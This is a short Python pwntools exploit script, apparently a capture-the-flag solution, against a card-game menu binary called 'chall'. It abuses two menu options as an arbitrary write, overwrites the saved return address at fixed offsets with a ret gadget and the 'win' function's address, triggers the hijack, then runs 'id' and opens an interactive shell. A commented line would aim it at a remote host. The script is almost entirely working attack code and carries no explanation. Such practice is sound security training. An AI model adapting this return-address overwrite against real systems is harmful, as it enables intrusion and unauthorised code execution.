from pwn import *

elf = context.binary = ELF('./chall')
p = process()
# p = remote("HOST", PORT)   # swap in for a remote target
rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]

CARDS_TO_RET_OFFSET = 160      
CARDS_TO_RET_PLUS8_OFFSET = 168  

def menu(choice):
    p.sendlineafter(b"> ", str(choice).encode())

def create(idx, title, atk):
    menu(1)
    p.sendlineafter(b"Slot (0-3): ", str(idx).encode())
    p.sendlineafter(b"Title: ", title)
    p.sendlineafter(b"ATK: ", str(atk).encode())

def point_effect_1(idx, offset):
    menu(2)
    p.sendlineafter(b"Slot (0-3): ", str(idx).encode())
    p.sendlineafter(b"Offset: ", str(offset).encode())

def point_effect_2(idx, value):
    menu(3)
    p.sendlineafter(b"Slot (0-3): ", str(idx).encode())
    p.sendlineafter(b"Value: ", str(value).encode())

def trigger():
    menu(4)


create(0, b"arrow card", 100)  

point_effect_1(0, CARDS_TO_RET_OFFSET)
point_effect_2(0, ret)

point_effect_1(0, CARDS_TO_RET_PLUS8_OFFSET)
point_effect_2(0, elf.sym['win'])

trigger()  

p.sendline(b"id")
p.interactive()
